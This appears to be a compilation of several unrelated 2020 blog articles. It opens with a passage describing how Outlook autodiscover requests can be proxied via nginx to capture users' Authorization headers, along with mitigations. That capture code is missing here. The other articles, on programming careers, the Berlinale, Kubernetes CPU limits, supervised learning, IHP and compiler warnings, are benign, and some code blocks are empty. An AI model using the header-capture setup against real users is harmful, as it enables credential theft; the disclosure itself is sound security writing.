<p>The problem with the autodiscovery situation described is that I can put a redirect in my web server's nginx config:</p>
<div><pre><code data-lang="">        location /autodiscover/autodiscover.xml {
            proxy_set_header X-Forwarded-For $remote_addr;
            proxy_pass http://localhost:8089;
        }
</code></pre></div>
<p>And of course similar options exist for Apache. With this in place, here's a dump of a proxied connection:</p>
<div><pre><code data-lang="">[2020-09-02 06:09:09] ERROR `/autodiscover/autodiscover.xml' not found.
127.0.0.1 - - [02/Sep/2020:06:09:09 UTC] "POST /autodiscover/autodiscover.xml HTTP/1.0" 404 299

</code></pre></div>
<p>What's crucial here is that as long as the server doesn't immediately reject the connection with a 404, the connecting client sends a discovery request that <em>includes an Authorization header</em>. The below code can take advantage of this:</p>
<div><pre><code data-lang="ruby"><span>#!/usr/bin/env ruby</span>

<p>Now obviously before I wrote this blog, I setup a temporary account and connected Outlook. Running the above code on my server started pumping this sort of content to the console.</p>
<div><pre><code data-lang="ruby"><span>$</span> <span>.</span><span>/</span><span>webrickprint</span><span>.</span><span>rb</span>

</code></pre></div>


<p>Microsoft's article discusses the <em>ExcludeHttpRedirect</em> registry key, but for most cases it's not a solution as it won't impact mobile users or anyone not using your exact version of Outlook on a corporate device.</p>

<p>The most approachable I've come up with is that a redirect can be put in place upstream if you use a service like Cloudflare. The following page rule takes this URL out of the hands of a web host by redirecting the connection to the correct place.</p>



<p>The practical365 site states "the root domain lookup makes absolutely no sense to me" and any attempt to read a discussion on the issue will lead you to plenty of discussion of this as nonsense. Unfortunately for as long as this priority exists, this problem will.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>"<a href="http://prog21.dadgum.com/154.html">Do You Really Want to be Doing This When You're 50?</a>"</p>
<p>Well, I didn't really want to be doing this when I was 20. I'm in it for the money. As long as there's money in programming, I'll stay for the money, in all likelihood.</p>
<p>What <em>else</em> do you want to be doing when you're 50? Give me a profession remotely close to programming in the following ways:</p>
<ul>
<li>Little or no required education</li>
<li>Good compensation, even for mediocre performers</li>
<li>Millions of jobs</li>
<li>No physical effort</li>
<li>No health or legal risks</li>
</ul>
<p>Programming is money for nothing. Programming is very easy to enter and extremely hard to quit. What would you do instead?</p>
<p>I work with three lawyers – two became programmers and one became a PM. I haven't met programmers who became lawyers. I do know an engineer – not a programmer – who became a patent attorney (reported reason: "at some point, you resent your manager being the age of your kids"). Would you like to become a patent attorney when you're 50?</p>
<p>I had a manager who decided he'd rather be a school teacher, thinking that this line of work is more beneficial to society. He quit after 8 months, saying in his parting interview to a mainstream newspaper: "Sometimes I just want to enter the classroom with a machine gun and open fire". He's with Samsung now; he feels that his contribution to smartphone imagers benefits society substantially enough.</p>
<p>One of my roommates at work has been studying a bunch of things for a while now. He's got a degree in psychology and in something called Visual Theater. He's been programming part-time all the while, which is how he financed his studies. He's programming as a part of his visual performances (there's computer music involved). He'll likely be programming to finance his art work. I'm not sure he plans to quit programming at any defined point.</p>
<p>I've seen a lot of people "quitting" to study anything from physics to philosophy, and then going back to programming. The money is addictive. There are many other sources of satisfaction, of course – which is why I run this blog for free – but much of this satisfaction has to do with <em>demand</em>, directly or indirectly, and is thus very much related to money. "Building something useful" and "making money" are close relatives.</p>
<p>You could, of course, become independently wealthy. But you probably won't, and then programming is your plan B. There's also a thing about material wealth – it's easily taken away. I'm from Soviet Russia, so I tend to exaggerate the likelihood of that – but really, property is easily confiscated, and paper money can become paper overnight. It's not just a USSR thing; the US <a href="http://en.wikipedia.org/wiki/Executive_Order_6102">confiscated gold</a> from its citizens at about the same time as the USSR. Professional ability, however, can't be confiscated. The prudent (paranoid?) independently wealthy programmer will thus make some effort to stay in a good shape.</p>
<p>There's the argument that professional programming is stressful. Again – compared to what? A doctor's work? A lawyer's work? Answering calls by irate customers while your responses are recorded for later inspection?</p>
<p>What stress? Programmers who can program at all – as in, print out a binary tree correctly – are very scarce. This scarcity makes it rather hard to push programmers around. You can try to bully them into doing unpaid overtime, but they quickly learn that it's a seller's market, and that you're basically bluffing. You have nobody to replace them with.</p>
<p>With demand outstripping supply, there's enough space in programming for everyone. This makes for a not-so-competitive environment, compared to, say, finance/investment banking type of jobs. Programmers are also typically shielded from customers and senior management – the kind of people who're always right, a trait making communication somewhat tiresome.</p>
<p>Deadlines? Sure, we have them, just like everybody else. Let's admit it though – we tend to miss them, and it's not very stressful to us unless we want it to be. If you're given an impossible schedule, and you do your best, and you miss the deadline, you can suffer deeply or you can maintain mental peace. The fact is that your material well-being is rarely in jeopardy because of a missed deadline, so your reaction is fully up to you.</p>
<p>There's the argument that programmers can't fully understand what's going on, what with all the APIs and layers and stuff. And if you don't understand your own environment, that's stressful and that's not fun. Fair enough; but again – who <em>does</em> understand his environment more than a programmer? A doctor digging into a patient's guts? A lawyer sifting through legal documents? An investor trading financial derivatives? A manager overseeing 10 or 20 programmers? With all the self-inflicted complexity, we're still in a better shape than most.</p>
<p>The fact is that there are relatively few programmers in their fifties around. Does it mean people don't survive in programming though? More likely, it is simply a result of growth. There were few 20 year old programmers 30 years ago – compared to 10 years ago. Therefore, there are fewer 50 year old programmers today than 30 year old programmers. To the extent that the growth in programming slows down, things will be different 20 years down the road.</p>
<p>So I'm not planning to quit programming, not because it's such a great source of joy by itself, but because it looks so good compared to just about anything else. Maybe not the most "passionate" statement – but passion burns out, whereas greed is sustainable. And if you plan to quit programming, I wonder what your alternative is, and I won't be surprised if you come back to programming in a few years.</p>

<h5>Competition | Generation | European Film Market &amp; Co-Production Market | Awards | Additional Information</h5>

</p>

<div>
<div><p>The Berlin International Film Festival has made its first decisions for the 2021 festival. The Berlinale 2021 is being planned as a physical festival. A hybrid model is intended for the <i>European Film Market</i> (<i>EFM</i>).<br>The implementation of the Festival and Market will take place in accordance with the then-applicable rules and regulations, thus ensuring the greatest possible security for all guests. Adjustments in the festival structure, the film programming and the total number of invited films will be defined by the festival management within the coming weeks.<br>Moreover, it has already been decided that in 2021 the section <i>Generation</i> will only show feature-length films with a running time of at least 60 minutes – and no short films – in its two competition programmes <i>Generation Kplus </i>and <i>Generation 14plus</i>.<br>The official film registration starts on September 1, 2020. You will then find the regulations on <a href="https://www.berlinale.de/en/home.html" title="" target="_self">www.berlinale.de</a>.</p>
<p>“Festivals and markets are places of encounter and communication. This applies to the public as well as to the industry. We see an important and unique feature of festivals in their lively relationship with the audience. In times of the corona pandemic, it has become even clearer that we still require analogue experience spaces in the cultural realm”, says the director duo of the Berlinale, Mariette Rissenbeek and Carlo Chatrian. “We are pleased that festivals with physically present audiences are slowly taking place again around the world, and we wish our colleagues much success.”</p>
<h3>2021: Performance Awards Gender-Neutral / New: Jury Prize</h3><p>The Berlinale has reorganised the prizes awarded by the International Jury in the <i>Competition</i>. For the first time, the performance awards will be defined in a gender-neutral way. Instead of the awards for the Best Actor and the Best Actress, a “Silver Bear for Best Leading Performance” and a “Silver Bear for Best Supporting Performance” shall each be awarded on a gender-neutral basis.</p>
<p>In addition thereto, the “Silver Bear Jury Prize” constitutes a further new awards category.</p>
<p>The former “Silver Bear Alfred Bauer Prize” was suspended in 2020 due to new findings about the position of the first Berlinale director, Alfred Bauer, under National Socialism, and this prize will no longer be awarded in the future. The evaluation of an external specialist historical study on Alfred Bauer will be available in late summer and then published.</p>
<p>The International Jury of the <i>Competition</i> will award the following eight prizes:</p>
<ul> <li>Golden Bear for Best Film (awarded to the film’s producers)</li><li>Silver Bear Grand Jury Prize</li><li>Silver Bear for Best Director</li><li>Silver Bear Jury Prize</li><li>Silver Bear for Best Leading Performance</li><li>Silver Bear for Best Supporting Performance</li><li>Silver Bear for Best Screenplay</li><li>Silver Bear for Outstanding Artistic Contribution</li> </ul><p>“We believe that not separating the awards in the acting field according to gender comprises a signal for a more gender-sensitive awareness in the film industry,” commented the director duo of the Berlinale.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>At Buffer, we’ve been using <a href="https://kubernetes.io/case-studies/buffer/">Kubernetes since 2016</a>.  We’ve been managing our k8s (kubernetes) cluster with <a href="https://kops.sigs.k8s.io/">kops</a>, it has about 60 nodes (on AWS), and runs about 1500 containers. Our transition to a micro-service architecture has been full of trial and errors. Even after a few years running k8s, we are still learning its secrets. This post will talk about how something we thought was a good thing, but ended up to be not as great as we thought: <strong>CPU limits</strong>.</p>
<h2 id="cpu-limits-and-throttling">CPU limits and Throttling</h2>
<p>It is s general recommendation to set CPU limits. <a href="https://cloud.google.com/blog/products/gcp/kubernetes-best-practices-resource-requests-and-limits">Google, among others, highly recommends it</a>. The danger of not setting a CPU limit is that containers running in the node could exhaust all CPU available. This can trigger a cascade of unwanted events such as having key Kubernetes processes (such as <code>kubelet</code>) to become unresponsive. So it is in theory a great thing to set CPU limit in order to protect your nodes.</p>
<p>CPU limits is the maximum CPU time a container can uses at a given period (100ms by default). The CPU usage for a container will never go above that limit you specified. Kubernetes use a mechanism called <a href="https://en.wikipedia.org/wiki/Completely_Fair_Scheduler">CFS Quota</a> to <strong>throttle</strong> the container to prevent the CPU usage from going above the limit. That means CPU will be artificially restricted, making the performance of your containers lower (and slower when it comes to latency).</p>
<h2 id="what-can-happen-if-we-dont-set-cpu-limits">What can happen if we don’t set CPU limits?</h2>
<p>We unfortunately experienced the issue. The <code>kubelet</code> , a process running on every node, and in charge of managing the containers (pods)  in the nodes became unresponsive. The node will turn into a <code>NotReady</code> state, and containers (pods) that were present will be rescheduled somewhere else, and create the issue in the new nodes. Definitely not ideal isn’t it?</p>
<h2 id="discovering-the-throttling-and-latency-issue">Discovering the throttling and latency issue</h2>
<p>A key metric to check when you are running container is the <code>throttling</code> . This indicate the number of time your container has been throttled. Interestingly, we’ve discovered a lot of containers having throttling no matter if the CPU usage was near the limits or not. Here the example of one of our main API:</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/cpu-usage-limits.png" alt="Kubernetes pods CPU usage and limits"></p>
<p>You can see in the animation that the CPU limits is set at <code>800m</code> (0.8 core, 80% of a core), and the peak usage is at most <code>200m</code> (20% of a core). After seeing, we might think we have plenty of CPU to let the service running before it throttle right? . Now check this one out:</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/cpu-throttling-low-usage.gif" alt="Kubernetes pods Low CPU usage, High limit, lot of throttling"></p>
<p>You can notice the CPU throttling occurs, even though the CPU usage is below the CPU Limits. The maximum CPU usage isn’t even near the CPU limits.</p>
<p>We’ve then found a few resources(<a href="https://github.com/kubernetes/kubernetes/issues/67577">github issue</a>, <a href="https://www.youtube.com/watch?v=LpFApeaGv7A&amp;feature=youtu.be&amp;t=1204">zanado talk</a>,  <a href="https://medium.com/omio-engineering/cpu-limits-and-aggressive-throttling-in-kubernetes-c5b20bd8a718">omio post</a>) talking about how throttling lead to poorer performances and latency for your services.</p>
<p><strong>Why do we see CPU throttling while CPU usage is low?</strong>
The tldr is basically a bug in the Linux kernel throttling unecessarly containers with CPU limit. If you’re curious about the nature of it, I invite you to check Dave Chiluk’s <a href="https://www.youtube.com/watch?v=UE7QX98-kO0">great talk</a>, a <a href="https://engineering.indeedblog.com/blog/2019/12/unthrottled-fixing-cpu-limits-in-the-cloud/">written version</a> also exists with more details.</p>

<p>After many long discussions, we’ve decided to remove the CPU limits for all services that were directly or indirectly on the critical path of our users.</p>
<p>This wasn’t an easy decision since we value the stability of our cluster. We’ve experimented in the past some instability in our cluster with services using too much resources and disrupting all other services present in the same node.  That time was a bit different, we understood more about how our services needed to be and had a good strategy to roll this out.</p>

<h2 id="how-to-keep-your-nodes-safe-when-removing-limits-">How to keep your nodes safe when removing limits ?</h2>
<p><strong>Isolating “No CPU Limits” services:</strong></p>
<p>In the past we’ve seen some nodes going to a <code>notReady</code> state, mainly because some services were using too much resources in a node.</p>
<p>We’ve decided to put those services on some specific nodes (tainted nodes), so those services will not disrupt all the “bounded” ones.  We have better control and could identify easier if any issue occurs with a node. We did this by tainting some nodes and adding toleration to services that were “unbounded”. Check <a href="https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/">the documentation</a> on how you can do that.</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/buffer-k8s-infrastructure-nodes.jpg" alt="Buffer k8s nodes infrastructure"></p>
<p><strong>Assigning the correct CPU and memory request:</strong></p>
<p>The main worry we had was service using too much resources and leading to nodes becoming unresponsive. Because we now had great observability of all services running in our cluster (with Datadog), I’ve analyzed a few months of usage of each service we wanted to “unbound”. I’ve assigned the maximum CPU usage as the CPU request with a &gt; 20% margin. This will make sure to have allocated space in a node. If k8s won’t try to schedule any other service in that node.</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/choose-cpu-request-based-on-max.png" alt="Chose CPU request based on max"></p>
<p>You can see in the graph that the peak CPU usage was <code>242m</code> CPU core (0.242 CPU core). Simply take this number and make it a bit higher to become the CPU request. You can notice that since the service is user facing, the peak CPU usage matches peak traffic time.</p>
<p>Do the same with your memory usage and requests, and you will be all set!
To add more safety, you can use the horizontal pod autoscaler to create new pods if the resource usage is high, so kubernetes will schedule it in nodes that have room for it. Set an alert if your cluster do not have any room, or use the node austoscaler to add it automatically.</p>
<p>The downsides are that we lose in “<a href="https://wiki.openvz.org/WP/Containers_density">container density</a>”, the number of containers that can run in a single node. We could also end up with a lot of “slack” during a low traffic time.
You could also hit some high CPU usage, but nodes autoscaling should help you with it.</p>
<h2 id="results">Results</h2>
<p>I’m happy to publish really great results after few weeks of experimentation, we’ve already seen really great latency improvements across all the services we’ve modified:</p>
<p><img src="https://erickhun.com/img/kubernetes-cpu-limits/speedup-no-cpu-limits2.png" alt="faster-kubernetes-containers"></p>
<p>The best result happened on our main landing page (<a href="https://buffer.com/">buffer.com</a>) where we speed the service up to <strong>22x</strong> faster!</p>

<h2 id="is-the-linux-kernel-bug-fixed">Is the Linux kernel bug fixed?</h2>
<p>The bug <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=763a9ec06c4">has been fixed and merged into the kernel</a> for Linux distribution running 4.19 or higher (kudo again to <a href="https://twitter.com/dchiluk">Dave Chiluk</a> for finding and fixing that).</p>
<p>However, as for <em>September 2nd 2020</em>, when reading <a href="https://github.com/kubernetes/kubernetes/issues/67577">the kubernetes issue</a>, we can see various Linux projects that keep referencing the issue, so I guess some Linux distribution still have the bug and working into integrating the fix.</p>
<p>If you are below a Linux distribution that has a kernel version below 4.19, I’d recommend you to upgrade to the latest Linux distribution for your nodes, but in any case, you should try removing the CPU limits and see if you have any throttling.  Here a non exhausting list of various managed Kubernetes services or Linux distribution:</p>
<ul>
<li>Debian: The latest version <a href="https://erickhun.com/posts/kubernetes-faster-services-no-cpu-limits/%5Bhttps://www.debian.org/releases/buster/">buster</a> has the fix,  it looks <a href="https://tracker.debian.org/news/1167353/accepted-linux-latest-419-105deb10u5deb9u1-source-amd64-into-oldstable-oldstable/">quite recent (august 2020)</a>. Some previous version might have get patched</li>
<li>Ubuntu: The latest version <a href="https://releases.ubuntu.com/20.04/">Ubuntu Focal Fosa 20.04</a> has the fix.</li>
<li>EKS has the fix since <a href="https://github.com/aws/containers-roadmap/issues/175">December 2019</a>. Upgrade your AMI if you have a version below than that</li>
<li>kops: Since <a href="https://github.com/kubernetes/kops/pull/9283">June 2020</a>,  <code>kops 1.18+</code> will start using <code>Ubuntu 20.04</code> as the default host image. If you’re using a lower version of kops, you’ll have to probably to wait the fix. We are currently in this situation.</li>
<li>GKE (Goggle Cloud) : The kernel fix was merged in <a href="https://cloud.google.com/container-optimized-os/docs/release-notes#cos-stable-77-12371-141-0">January 2020</a>. But it does looks like throttling are <a href="https://news.ycombinator.com/item?id=24356903">still hapenning</a></li>
</ul>
<p>ps: Feel free to <a href="https://news.ycombinator.com/item?id=24351566">comment</a> if you have more precise information, I’ll update the post accordingly</p>
<p><strong>If the fix solved the throttling issue?</strong></p>
<p>I’m unsure if totally solved the issue. I will give it a try once we hit a kernel version where the fix has been implemented and will update this post accordingly. If anyone have upgrade I’m keen to hear their results.</p>
<h2 id="takeaways">Takeaways</h2>
<ul>
<li>If you run Docker containers under Linux (no matter Kubernetes/Mesos/Swarm) you might have your containers underperforming because of throttling</li>
<li>Upgrade to the latest version of your distribution hoping the bug is fixed</li>
<li>Removing CPU limit is a solution to solve this issue, but this is dangerous and should be made with extra-care (prefer upgrading your kernel first and monitor throttling first)</li>
<li>If you remove CPU limits, carefully monitor CPU and  memory usage in your nodes, and make sure your CPU requests are</li>
<li>A safe way to is to use the Horizontal pod autoscaler to create new pods if the resource usage is high, so kubernetes will schedule it in nodes that have space.</li>
</ul>
<p>👉<strong>Hacker news update: lot of insighful <a href="https://news.ycombinator.com/item?id=24351566">comments</a>. I’ve updated the post to have better recommendations. You should prefer upgrading your kernel version over removing the CPU limits. Be really mindful, set the proper CPU requests, add the necessary monitoring when you do this</strong></p>
<p>I hope this post helps you get performance gains on the containers you are running. If so, don’t hesitate to share or <a href="https://news.ycombinator.com/item?id=24351566">comment</a> with always some insighful comments</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<!--kg-card-begin: markdown--><p>Supervised learning is perhaps the most common form of machine learning task in use nowadays.</p>
<p>This form of learning makes use of a labeled training dataset to create a model that predicts a target of interest. If this line makes absolutely no sense to you, don't worry. After reading this article you will have a clear understanding of supervised learning and its two most popular applications: regression and classification.</p>
<h2 id="trainingmachineswithexamples">Training machines with examples</h2>
<p>Supervised learning is a process in which you teach a machine to predict a particular result by feeding it examples 'with the right answers'.</p>
<p>The first thing you need to know is what are you trying to predict. You might want to create a program that classifies pet photos as <em>dog photos</em> or <em>cat photos</em>, or a program that predicts the prices of houses in different districts in Sydney, Australia.</p>
<p>After deciding the variable you are trying to predict (your <strong>target</strong>), it's time to gather data examples from the real world and <em>label them</em>. In our first example, we would start gathering photos with dogs and photos with cats and tagging them with the right category. This photo of a puppy is a dog photo, that photo of a cat playing with a laser is a cat photo, and so on for every example.</p>
<p>Before the training stage, you will set aside a percentage of your training set to test the performance of your models. Afterwards, you will feed your labeled examples into an algorithm that will learn to generalize a relationship between the inputs (the photos) and the targets (dog/cat), producing a model you can use to classify fresh images it has never seen before. In this context, this is what <em>training</em> means: teaching a machine to perform actions learned from training data.</p>
<p>You can evaluate how well the model performs on your training set, the one you put aside before training. If the results are satisfying, you can deploy the model into production and use it to solve the original problem. The following diagram shows a high-level view of the supervised learning process.</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/SupervisedLearning.png" alt="SupervisedLearning"></p>
<p>This is an example of a classification task.</p>
<p><strong>Classification</strong> and <strong>regression</strong> are the most common applications of supervised learning. If you are interested in a career in machine learning you will likely spend most of your time creating these types of models, so let's take a look at them.</p>
<h2 id="classifyingtheworld">Classifying the world</h2>
<p>A classifier is a model that tells you the <strong>class</strong>(category) an instance of your data belongs to. In the previous example, our instances were photos of pets, and the classes were <em>cat photos</em> and <em>dog photos</em>.</p>
<p>The training set for classification tasks is usually a collection of instances (individual instances of the phenomenon you are trying to model) with a <em>label</em> that specifies the class they belong to.</p>
<p>Classifiers can be further classified ( ͡° ͜ʖ ͡° ) into different subtypes depending on the number of target classes (binary or multiclass) and how many categories an instance can belong to at the same time (single-label and multi-label), let's take a look at those.</p>
<h4 id="binaryclassifiers">Binary classifiers</h4>
<p>A binary classifier is a model that classifies examples into two possible classes. Classifiers are capable of telling you if an email is either <strong>spam</strong> or <strong>not spam</strong>, if a photo of a face is <strong>happy</strong> or <strong>sad</strong> or if a substance is <strong>harmless</strong> or <strong>dangerous</strong>.</p>
<p>The most common setup for binary classification is to have a positive class (<em>class</em>) and a negative class (<em>not-class</em>). In this sense, you can re-define the previous examples as spam/not-spam, happy/not-happy and dangerous/not-dangerous.</p>
<p>Some types of binary classifiers don't just tell you a result, but they also provide you a probability that the instance you are classifying belongs to the predicted class.</p>
<p>Binary classifiers are some of the most studied and used models in machine learning, and many other models build on top of them (like some forms of multiclass classifiers).</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/BinaryClassifier.png" alt="BinaryClassifier"></p>
<h4 id="multiclassclassifiers">Multiclass classifiers</h4>
<p>As you might imagine from the title, a multiclass classifier is a model that classifies instances into many categories. Like in the previous case you can get the results as the probability of belonging to a particular class.</p>
<p>It's important to note that there is a difference depending on the number of classes an instance can belong to at the same time.</p>
<p>If the classes are mutually exclusive (an object can only belong to one class at a time) you are building a <strong>single-label multiclass classifier</strong>. If an instance can belong to more than 1 class at the same time then you need a <strong>multi-label classifier</strong>.</p>
<p>Depending on the particular scenario, your choice of algorithms and evaluation methods will differ.</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/MulticlassClassifier.png" alt="MulticlassClassifier"></p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/MultilabelClassifier.png" alt="MultilabelClassifier"></p>
<h2 id="regression">Regression</h2>
<p>The goal of a regression model is to predict a continuous value. The training set for a regression problem is usually a collection of instances with the associated numeric value you are trying to predict.</p>
<p>The following are some examples of regression problems</p>
<ul>
<li>Predict the price of houses in Amsterdam given the size of the house (in square meters), the year the house was built, the average income of the area in which the house is located, the number of bedrooms and the color of the mailbox.</li>
<li>Predict a person's likelihood developing diabetes given the height, weight, number of cigarettes smoked per day, average caloric intake, average hours of physical activity per week and amount of carbs consumed per day.</li>
<li>Predict the stock price of a company one year from now based on the number of Disney films released last year, the color of underwear the CEO wears with more frequency and the title of his/her aunt's favorite song.</li>
</ul>
<p>Regression tasks are extremely common in machine learning. If you decide to pursue a career in data science or ML engineering, many of the models you'll build are likely aimed to solve regression problems.</p>
<p><img src="https://www.brainstobytes.com/content/images/2019/11/SimpleRegressor.png" alt="SimpleRegressor"></p>
<h2 id="thecoreassumptionofsupervisedlearning">The core assumption of supervised learning</h2>
<p>Ok, now you have an idea of what supervised learning is and how the process works. In brief, you collect a lot of data relevant to the problem you are trying to solve and label it with the <em>correct answers</em>, or the expected result your model is trying to predict. Then, all this training data is fed into an algorithm that will generate a model that maps the inputs into classes(classification) or values(regression).</p>
<p>For this process to work, the information contained in the training set needs to have enough <strong>predictive power</strong> for the algorithm to find a correlation between the two sets.</p>
<p>For example, if you want to predict the likelihood a given person has to develop diabetes, you might want data like the BMI, genetic predisposition and dietary habits. All 3 with powerful correlation with the variable you are trying to find (likelihood to develop a disease, in this case). Other data, like favorite film, shoe size, and favorite headphone brand has less predictive power for this particular target, so it makes little sense to add it to the training set.</p>
<p>Sometimes, the data gathered doesn't provide enough information to build a model that performs well, in this scenario you need to reformulate the problem or find data with better quality.</p>
<p>Supervised learning is a huge topic with lots of important concepts. The goal of this article was to present a high-level view of the topic. Hopefully, by now you have a better understanding of supervised learning, and we will be prepared to dig deeper in more elaborate topics in future articles.</p>
<p>Thank you for reading!</p>

            <ul>
                <li>
                    <strong>Starting an IHP app</strong>

                    <p>
                        Let's first take a look at what happens when you start your IHP app by running <code>./start</code>.
                    </p>

                    <p>
                        The <a href="https://github.com/digitallyinduced/ihp-boilerplate/blob/master/start" target="_blank"><code>./start</code></a> script in your project is basically just a small wrapper that makes sure that all dependencies that are managed by nix are available and then calls the <code>RunDevServer</code> binary. <a href="https://github.com/digitallyinduced/ihp/blob/master/IHP/IDE/DevServer.hs" target="_blank">This binary is part of IHP</a> and does the actual application startup as well as managing the postgres server.
                    </p>

                    <p>
                        You can think of <code>RunDevServer</code> as a small process manager. When <code>RunDevServer</code> is started, it will directly start all processes required for your application to run:
                        </p><ul>
                            <li>the web-based IDE</li>
                            <li>a status server on port 8000 showing the compiler status and possible type errors</li>
                            <li>a websocket server used for communicating file changes for live reloading</li>
                            <li>a ghci (the standard haskell REPL) where it directly loads your app</li>
                            <li>a postgres server bound to unix socket</li>
                            <li>a file watcher to track haskell and css file changes</li>
                        </ul>
                    

                    <p>
                        All these processes are started in parallel for fast performance and synchronised in the main event loop of the dev server. Made possible thanks to haskells great concurrency capabilities.
                    </p>

                    <p>
                        The most important process is the ghci process with your app. Instead of fully recompiling your app on every file change, IHP loads your app in the repl and then refreshes only the changed files. 
                    </p>

                    <p>
                        At first ghci needs a couple of seconds to load all haskell files of your application. While loading your application the status server is serving all http requests on localhost:8000. The status server will also show all type errors in case ghci failed to load your app. When the ghci finished loading, the status server is stopped and your application is started on localhost:8000.
                    </p>

                </li>

                <li>
                    <strong>Haskell File Changes</strong>

                    <p>
                        <iframe width="100%" height="500" src="https://www.youtube.com/embed/nTjjDo57B8g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
                    </p>

                    <p>
                        Once your application is started, the dev server mainly deals with file changes. Using a file watcher the dev server is notified about any changes to your haskell files in your project. When a haskell file is changed the app process running in the ghci process is stopped and a refresh (<code>:r</code>) is triggered. The refresh is usually very fast. Once completed the app server will be started again.
                    </p>

                    <p>
                        Once the haskell app has started, open browser pages will be notified using a websocket connection. The open pages will fetch the current page via ajax and will then update the dom using <a href="https://github.com/patrick-steele-idem/morphdom" target="_blank">a diff and patch approach</a>. So only dom nodes that have actually changed will be touched during the live reloading. This approach will keep existing page state like scroll position or text typed into a form field. It allows for a very fast and productive feedback cycle.
                    </p>
                </li>

                <li>
                    <strong>CSS File Changes</strong>

                    <blockquote><p lang="en" dir="ltr">Did you know: <a href="https://twitter.com/hashtag/ihp?src=hash&amp;ref_src=twsrc%5Etfw">#ihp</a> also supports live reloading of CSS. <a href="https://t.co/uRCCr3gkHz">pic.twitter.com/uRCCr3gkHz</a></p>— digitally induced (@digitallyinduce) <a href="https://twitter.com/digitallyinduce/status/1277583045919375363?ref_src=twsrc%5Etfw">June 29, 2020</a></blockquote> 
                    

                    <p>
                        IHP also supports live reloading of CSS files. Once IHP sees a file change to your CSS files in the <code>static</code> directory it will notify all open browser tabs using its websocket connection. Once notified in the browser IHP will look for any <code>&lt;link rel="stylesheet"&gt;</code> and <a href="https://github.com/digitallyinduced/ihp/blob/master/lib/IHP/static/livereload.js#L68" target="_blank">will reload the css file using a cache buster</a>.
                    </p>

                    <p>
                        This is only possible because nix allows us to pin down the set of package definitions to a specific git commit of the nix package registry.
                    </p>
                </li>

                <li>
                    <strong>Type Errors</strong>

                    <p>
                        Sometimes you make a change which will stop your application from compiling. In these error cases the status server jumps in and starts listening on localhost:8000. The status server will then display the error message so you can quickly fix it:
                    </p>

                    <img src="https://ihp.digitallyinduced.com/releases/v07082020.png" alt="Example of a status server error message">

                    <p>
                        Additionally open browser tabs will be notified about this and will refresh. This way the error is instantly visible to you.
                    </p>
                </li>

                <li>
                    <strong>Batteries-included</strong>

                    <p>
                        While the above steps are technically complicated, when doing actual development you will not see much of this complexity.  Lots of time have been spent to find the best approach and smoothing out all the edge cases. The whole process is very much inspired by PHP where you just make file changes and it works. The live reloading really <q>just works</q>.
                    </p>

                    <p>
                        The dev server is the heart of IHP and makes the dev process extremely productive. You get all the benefits of type-safety with the development speed you previously only got with scripting languages. If you haven't already it's time to try it out! 🚀
                    </p>
                </li>

<![CDATA[Two musings on the design of compiler warnings]]>

September 2, 2020 | https://quuxplusone.github.io/blog/2020/09/02/wparentheses/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2020/09/02/wparentheses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Today I finally write down some musings on two peripheral aspects of
compiler diagnostic design that I think are very important for certain kinds of warnings.
My first musing relates to <em>fixits</em>, and my second to <em>suppression mechanisms</em>.</p>

<h2 id="what-is-a-fixit">What is a fixit?</h2>

<p>Most C++ compilers these days don’t just tell you <em>that</em> a problem occurred
(like <a href="https://www.gnu.org/fun/jokes/ed-msg.txt"><code>ed</code>’s famous <code>?</code> prompt</a>),
and <em>what</em> the problem is (“expected identifier,” for example).
They’ll try to tell you <em>how to fix</em> the problem.</p>

<p>Compare GCC 4.1’s error messages with GCC 4.6’s. (<a href="https://godbolt.org/z/KM8P9E">Godbolt.</a>)
For this input:</p>



<p>GCC 4.1 complains merely that you have put <code>multiple types in one declaration</code>.
GCC 4.6 more helpfully complains that it <code>expected ';' after struct definition</code>,
and points to the exact position where it believes a semicolon should be inserted.</p>

<p>GCC 7 goes even further, and suggests a <em>fixit</em> — a machine-readable “spellcheck suggestion”
that some IDEs are able to apply with a single click.</p>

<div><div><pre><code>test.cc:1:12: error: expected ';' after struct definition
 struct S {}
            ^
            ;
</code></pre></div></div>

<p>In medical terms, the compiler has gone from simply detecting the <em>symptom</em>
(“this declaration seems to contain two types, which isn’t valid C++”)
to producing a <em>diagnosis</em> of the disease (“I bet you forgot a semicolon somewhere”);
and a compiler that supports fixits is actually <em>prescribing a treatment plan</em>.
Each of these steps is a quantum leap beyond the previous one in terms of both user-friendliness
and implementation complexity.</p>

<h2 id="what-is-a-suppression-mechanism">What is a suppression mechanism?</h2>

<p>Suppression mechanisms relate to compiler <em>warnings</em>, not compiler errors.
Consider the following snippet (<a href="https://godbolt.org/z/fTnao9">Godbolt</a>):</p>

<div><div><pre><code>if (argc = 1)
    puts("hello");
</code></pre></div></div>

<p>Every mainstream compiler warns on this suspicious-looking code (GCC and Clang with <code>-Wall</code>; MSVC with <code>-W4</code>).
Here’s GCC’s diagnostic:</p>

<div><div><pre><code>warning: suggest parentheses around assignment used as truth value [-Wparentheses]
    4 |     if (argc = 1)
      |         ~~~~~^~~
</code></pre></div></div>

<p>Notice that GCC doesn’t even bother to explain really what its diagnosis is;
it emits a passive-aggressive warning message that does nothing more than suggest how to
shut itself up!</p>

<p>The diagnosis, of course, is that frequently people mean to write <code>if (argc == 1)</code>
but their finger slips and they write <code>if (argc = 1)</code> instead, which unfortunately
is also valid C++ code. Every mainstream compiler has evolved the same way to deal with this:
if you really mean <code>=</code>, then you write an extra pair of parentheses around the expression, like so:</p>



